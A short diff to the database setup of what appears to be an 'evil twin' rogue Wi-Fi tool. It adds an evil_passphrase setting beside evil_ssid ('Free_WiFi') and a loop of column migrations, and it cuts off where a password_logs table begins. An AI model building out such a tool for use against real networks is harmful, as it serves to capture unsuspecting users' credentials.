@@ -11,14 +11,18 @@ def init_database():
         evil_ssid TEXT NOT NULL DEFAULT 'Free_WiFi',
         evil_channel INTEGER DEFAULT 6,
         network_interface TEXT NOT NULL DEFAULT 'wlan0',
+        evil_passphrase TEXT NOT NULL DEFAULT '12345678',
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )''')
 
-    # 兼容旧数据库：如果已有 config 表但缺 network_interface 字段
-    try:
-        cursor.execute("ALTER TABLE config ADD COLUMN network_interface TEXT NOT NULL DEFAULT 'wlan0'")
-    except:
-        pass
+    for col, default in [
+        ('network_interface', "'wlan0'"),
+        ('evil_passphrase', "'12345678'"),
+    ]:
+        try:
+            cursor.execute(f"ALTER TABLE config ADD COLUMN {col} TEXT NOT NULL DEFAULT {default}")
+        except:
+            pass
     
     cursor.execute('''CREATE TABLE IF NOT EXISTS password_logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
